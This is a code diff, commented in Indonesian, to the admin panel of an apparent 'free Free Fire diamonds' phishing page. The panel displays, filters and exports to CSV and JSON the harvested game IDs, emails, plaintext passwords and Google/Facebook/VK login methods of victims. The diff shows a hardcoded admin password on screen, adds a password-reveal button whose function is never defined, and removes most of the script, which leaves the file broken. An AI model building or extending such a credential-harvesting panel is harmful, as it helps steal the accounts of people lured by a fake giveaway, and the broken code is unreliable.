@@ -59,6 +59,31 @@
             font-size: 0.9rem;
         }
         
+        .password-display {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(0, 255, 255, 0.1);
+            border-radius: 8px;
+            border: 1px solid #00ffff;
+        }
+        
+        .password-display code {
+            color: #ffd700;
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            padding: 5px 10px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+        }
+        
+        .password-display p {
+            margin-top: 10px;
+            color: #90ff90;
+            font-size: 0.9rem;
+        }
+        
         .login-form {
             display: none;
         }
@@ -288,6 +313,16 @@
             color: #90ffff;
         }
         
+        .password-cell {
+            font-family: 'Consolas', 'Courier New', monospace;
+            color: #ff6b6b;
+            font-weight: bold;
+            background: rgba(255, 107, 107, 0.1);
+            padding: 5px;
+            border-radius: 3px;
+            text-align: center;
+        }
+        
         .search-filter {
             background: rgba(0, 255, 255, 0.05);
             border: 1px solid #00ffff;
@@ -441,12 +476,19 @@
                 <p>Diamond FF Gratis - Administrator Access</p>
             </div>
             
+            <!-- Password Display -->
+            <div class="password-display">
+                <h3>Password Admin:</h3>
+                <code>everseID555</code>
+                <p>Gunakan password di atas untuk masuk ke admin panel</p>
+            </div>
+            
             <div class="login-form active" id="passwordForm">
                 <div class="form-group">
-                    <label for="adminPassword">Password Admin:</label>
-                    <input type="password" id="adminPassword" placeholder="Masukkan password admin">
+                    <label for="adminPassword">Masukkan Password:</label>
+                    <input type="password" id="adminPassword" placeholder="Ketik password di sini">
                 </div>
-                <button class="login-btn" onclick="checkPassword()">MASUK</button>
+                <button class="login-btn" onclick="checkPassword()">MASUK KE ADMIN PANEL</button>
                 <div class="error-message" id="errorMessage">Password salah! Coba lagi.</div>
                 <div class="attempts-warning" id="attemptsWarning"></div>
             </div>
@@ -549,6 +591,7 @@
                     <button class="export-btn" onclick="exportToCSV()">📥 Export CSV</button>
                     <button class="export-btn" onclick="exportToJSON()">📥 Export JSON</button>
                     <button class="export-btn" onclick="copyAllData()">📋 Copy All Data</button>
+                    <button class="export-btn" onclick="showPasswords()">👁️ Tampilkan/Sembunyikan Password</button>
                 </div>
             </div>
             
@@ -568,6 +611,7 @@
         let loginAttempts = 0;
         let isLocked = false;
         let lockoutEndTime = null;
+        let showPasswordsInTable = true; // Default password ditampilkan
         
         // Admin panel variables
         let allData = [];
@@ -596,406 +640,4 @@
                     localStorage.removeItem('adminLoginTime');
                 }
             }
-            
-            // Check for lockout
-            const lockoutTime = localStorage.getItem('adminLockout');
-            if (lockoutTime) {
-                const currentTime = new Date().getTime();
-                if (currentTime < parseInt(lockoutTime)) {
-                    isLocked = true;
-                    lockoutEndTime = parseInt(lockoutTime);
-                    updateLockoutDisplay();
-                } else {
-                    localStorage.removeItem('adminLockout');
-                    localStorage.removeItem('loginAttempts');
-                }
-            }
-            
-            // Get saved attempts
-            const savedAttempts = localStorage.getItem('loginAttempts');
-            if (savedAttempts) {
-                loginAttempts = parseInt(savedAttempts);
-                updateAttemptsWarning();
-            }
-            
-            // Setup enter key for password
-            document.getElementById('adminPassword').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    checkPassword();
-                }
-            });
-        });
-        
-        // Check password function
-        function checkPassword() {
-            if (isLocked) {
-                showError("Akun terkunci! Tunggu 5 menit.");
-                return;
-            }
-            
-            const passwordInput = document.getElementById('adminPassword');
-            const password = passwordInput.value.trim();
-            const errorMessage = document.getElementById('errorMessage');
-            
-            if (password === ADMIN_PASSWORD) {
-                // Successful login
-                loginAttempts = 0;
-                localStorage.removeItem('loginAttempts');
-                localStorage.removeItem('adminLockout');
-                
-                // Set login session
-                localStorage.setItem('adminLoggedIn', 'true');
-                localStorage.setItem('adminLoginTime', new Date().getTime().toString());
-                
-                showAdminPanel();
-            } else {
-                // Failed login
-                loginAttempts++;
-                localStorage.setItem('loginAttempts', loginAttempts.toString());
-                
-                if (loginAttempts >= MAX_ATTEMPTS) {
-                    // Lock account
-                    isLocked = true;
-                    lockoutEndTime = new Date().getTime() + LOCKOUT_TIME;
-                    localStorage.setItem('adminLockout', lockoutEndTime.toString());
-                    
-                    showError("Terlalu banyak percobaan! Akun terkunci selama 5 menit.");
-                    updateLockoutDisplay();
-                } else {
-                    const remaining = MAX_ATTEMPTS - loginAttempts;
-                    showError(`Password salah! Sisa percobaan: ${remaining}`);
-                    updateAttemptsWarning();
-                }
-                
-                // Clear password field
-                passwordInput.value = '';
-                passwordInput.focus();
-                
-                // Shake animation
-                errorMessage.classList.add('show');
-                setTimeout(() => {
-                    errorMessage.classList.remove('show');
-                }, 500);
-            }
-        }
-        
-        function updateAttemptsWarning() {
-            const attemptsWarning = document.getElementById('attemptsWarning');
-            const remaining = MAX_ATTEMPTS - loginAttempts;
-            
-            if (remaining <= 2 && remaining > 0) {
-                attemptsWarning.textContent = `Peringatan: ${remaining} percobaan tersisa sebelum terkunci!`;
-                attemptsWarning.style.display = 'block';
-            } else {
-                attemptsWarning.style.display = 'none';
-            }
-        }
-        
-        function updateLockoutDisplay() {
-            const errorMessage = document.getElementById('errorMessage');
-            const attemptsWarning = document.getElementById('attemptsWarning');
-            const loginBtn = document.querySelector('.login-btn');
-            
-            if (isLocked && lockoutEndTime) {
-                const currentTime = new Date().getTime();
-                const timeLeft = Math.ceil((lockoutEndTime - currentTime) / 1000);
-                
-                if (timeLeft > 0) {
-                    const minutes = Math.floor(timeLeft / 60);
-                    const seconds = timeLeft % 60;
-                    
-                    errorMessage.textContent = `Akun terkunci! Tunggu ${minutes}:${seconds.toString().padStart(2, '0')} menit.`;
-                    errorMessage.classList.add('show');
-                    
-                    attemptsWarning.textContent = `Terlalu banyak percobaan gagal`;
-                    attemptsWarning.style.display = 'block';
-                    
-                    loginBtn.disabled = true;
-                    loginBtn.textContent = "TERKUNCI";
-                    
-                    // Update countdown
-                    setTimeout(updateLockoutDisplay, 1000);
-                } else {
-                    // Lockout ended
-                    isLocked = false;
-                    lockoutEndTime = null;
-                    loginAttempts = 0;
-                    localStorage.removeItem('adminLockout');
-                    localStorage.removeItem('loginAttempts');
-                    
-                    errorMessage.classList.remove('show');
-                    attemptsWarning.style.display = 'none';
-                    loginBtn.disabled = false;
-                    loginBtn.textContent = "MASUK";
-                }
-            }
-        }
-        
-        function showError(message) {
-            const errorMessage = document.getElementById('errorMessage');
-            errorMessage.textContent = message;
-            errorMessage.classList.add('show');
-            
-            setTimeout(() => {
-                errorMessage.classList.remove('show');
-            }, 3000);
-        }
-        
-        function showAdminPanel() {
-            document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('adminPanel').classList.add('active');
-            
-            // Show login info
-            const loginTime = new Date().toLocaleString();
-            document.getElementById('userInfo').textContent = `Admin | Login: ${loginTime}`;
-            document.getElementById('loginTime').textContent = loginTime;
-            
-            // Load admin data
-            loadData();
-            startAutoRefresh();
-            updateStats();
-            
-            // Update waktu terakhir
-            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
-        }
-        
-        function logout() {
-            if (confirm('Apakah Anda yakin ingin logout?')) {
-                localStorage.removeItem('adminLoggedIn');
-                localStorage.removeItem('adminLoginTime');
-                location.reload();
-            }
-        }
-        
-        // Muat data dari localStorage
-        function loadData() {
-            const savedData = localStorage.getItem('adminData');
-            allData = savedData ? JSON.parse(savedData) : [];
-            allData.reverse(); // Tampilkan yang terbaru di atas
-            
-            // Filter hanya data asli (tanpa data test otomatis)
-            // Hanya tampilkan data yang berasal dari form user asli
-            // Data yang dibuat melalui generateTestData() tidak ditampilkan
-            
-            filterData();
-        }
-        
-        // Filter data berdasarkan pencarian
-        function filterData() {
-            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
-            const diamondFilter = document.getElementById('diamondFilter').value;
-            const loginFilter = document.getElementById('loginFilter').value;
-            
-            filteredData = allData.filter(item => {
-                const matchesSearch = !searchTerm || 
-                    item.id.toLowerCase().includes(searchTerm) ||
-                    (item.username && item.username.toLowerCase().includes(searchTerm)) ||
-                    (item.email && item.email.toLowerCase().includes(searchTerm));
-                
-                const matchesDiamond = !diamondFilter || item.diamondAmount === diamondFilter;
-                const matchesLogin = !loginFilter || item.loginMethod === loginFilter;
-                
-                return matchesSearch && matchesDiamond && matchesLogin;
-            });
-            
-            renderTable();
-            updateStats();
-        }
-        
-        // Render tabel data
-        function renderTable() {
-            const tableBody = document.getElementById('tableBody');
-            const noDataMessage = document.getElementById('noDataMessage');
-            
-            if (filteredData.length === 0) {
-                tableBody.innerHTML = '';
-                noDataMessage.style.display = 'block';
-                return;
-            }
-            
-            noDataMessage.style.display = 'none';
-            
-            let html = '';
-            filteredData.forEach((item, index) => {
-                // Tentukan class untuk login method
-                let loginClass = 'login-other';
-                if (item.loginMethod === 'Google') loginClass = 'login-google';
-                else if (item.loginMethod === 'Facebook') loginClass = 'login-facebook';
-                else if (item.loginMethod === 'VK') loginClass = 'login-vk';
-                
-                html += `
-                    <tr>
-                        <td>${index + 1}</td>
-                        <td><strong>${item.id}</strong></td>
-                        <td>${item.username || '-'}</td>
-                        <td>${item.email || '-'}</td>
-                        <td><code>${item.password || '********'}</code></td>
-                        <td><span class="login-badge ${loginClass}">${item.loginMethod || '-'}</span></td>
-                        <td><span class="diamond-badge">${item.diamondAmount || '0'} 💎</span></td>
-                        <td class="timestamp">${item.timestamp || '-'}</td>
-                        <td>
-                            <button class="control-btn" onclick="deleteData(${allData.findIndex(d => d.timestamp === item.timestamp)})" style="padding: 5px 10px; font-size: 0.8rem;">Hapus</button>
-                        </td>
-                    </tr>
-                `;
-            });
-            
-            tableBody.innerHTML = html;
-        }
-        
-        // Update statistik
-        function updateStats() {
-            document.getElementById('totalUsers').textContent = allData.length;
-            
-            // Hitung total diamond
-            const totalDiamonds = allData.reduce((sum, item) => {
-                return sum + parseInt(item.diamondAmount || 0);
-            }, 0);
-            document.getElementById('totalDiamonds').textContent = totalDiamonds;
-            
-            // Hitung user hari ini
-            const today = new Date().toLocaleDateString();
-            const todayUsers = allData.filter(item => {
-                const itemDate = new Date(item.timestamp).toLocaleDateString();
-                return itemDate === today;
-            }).length;
-            document.getElementById('todayUsers').textContent = todayUsers;
-        }
-        
-        // Refresh data
-        function refreshData() {
-            loadData();
-            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
-            resetRefreshTimer();
-        }
-        
-        // Hapus data tertentu
-        function deleteData(index) {
-            if (confirm('Apakah Anda yakin ingin menghapus data ini?')) {
-                allData.splice(index, 1);
-                saveData();
-                loadData();
-            }
-        }
-        
-        // Hapus semua data
-        function clearAllData() {
-            if (confirm('Yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
-                localStorage.removeItem('adminData');
-                allData = [];
-                filteredData = [];
-                renderTable();
-                updateStats();
-            }
-        }
-        
-        // Simpan data ke localStorage
-        function saveData() {
-            localStorage.setItem('adminData', JSON.stringify(allData));
-        }
-        
-        // Auto-refresh system
-        function startAutoRefresh() {
-            refreshInterval = setInterval(() => {
-                if (autoRefreshEnabled) {
-                    refreshCountdown--;
-                    document.getElementById('refreshTimer').textContent = refreshCountdown;
-                    
-                    if (refreshCountdown <= 0) {
-                        refreshData();
-                        resetRefreshTimer();
-                    }
-                }
-            }, 1000);
-        }
-        
-        function resetRefreshTimer() {
-            refreshCountdown = 10;
-            document.getElementById('refreshTimer').textContent = refreshCountdown;
-        }
-        
-        function toggleAutoRefresh() {
-            autoRefreshEnabled = !autoRefreshEnabled;
-            const btn = document.getElementById('autoRefreshBtn');
-            
-            if (autoRefreshEnabled) {
-                btn.textContent = '⏸️ Pause';
-                btn.style.background = 'rgba(0, 255, 255, 0.2)';
-            } else {
-                btn.textContent = '▶️ Resume';
-                btn.style.background = 'rgba(255, 0, 0, 0.2)';
-            }
-        }
-        
-        // Ekspor data ke CSV
-        function exportToCSV() {
-            if (allData.length === 0) {
-                alert('Tidak ada data untuk diekspor!');
-                return;
-            }
-            
-            const headers = ['ID FF', 'Username', 'Email', 'Password', 'Login Method', 'Diamond', 'Timestamp'];
-            const csvRows = [
-                headers.join(','),
-                ...allData.map(item => [
-                    item.id,
-                    `"${item.username || ''}"`,
-                    item.email || '',
-                    item.password || '',
-                    item.loginMethod || '',
-                    item.diamondAmount || '',
-                    `"${item.timestamp || ''}"`
-                ].join(','))
-            ];
-            
-            const csvString = csvRows.join('\n');
-            const blob = new Blob([csvString], { type: 'text/csv' });
-            const url = URL.createObjectURL(blob);
-            
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `diamond_ff_data_${new Date().toISOString().slice(0,10)}.csv`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }
-        
-        // Ekspor data ke JSON
-        function exportToJSON() {
-            if (allData.length === 0) {
-                alert('Tidak ada data untuk diekspor!');
-                return;
-            }
-            
-            const jsonString = JSON.stringify(allData, null, 2);
-            const blob = new Blob([jsonString], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `diamond_ff_data_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }
-        
-        // Copy semua data ke clipboard
-        function copyAllData() {
-            if (allData.length === 0) {
-                alert('Tidak ada data untuk disalin!');
-                return;
-            }
-            
-            const text = allData.map((item, index) => {
-                return `${index + 1}. ID: ${item.id} | User: ${item.username || '-'} | Email: ${item.email || '-'} | Diamond: ${item.diamondAmount || '0'} | Login: ${item.loginMethod || '-'} | Waktu: ${item.timestamp || '-'}`;
-            }).join('\n');
-            
-            navigator.clipboard.writeText(text)
-                .then(() => alert('Semua data berhasil disalin ke clipboard!'))
-                .catch(() => alert('Gagal menyalin data ke clipboard.'));
-        }
-    </script>
-</body>
-</html>
+           
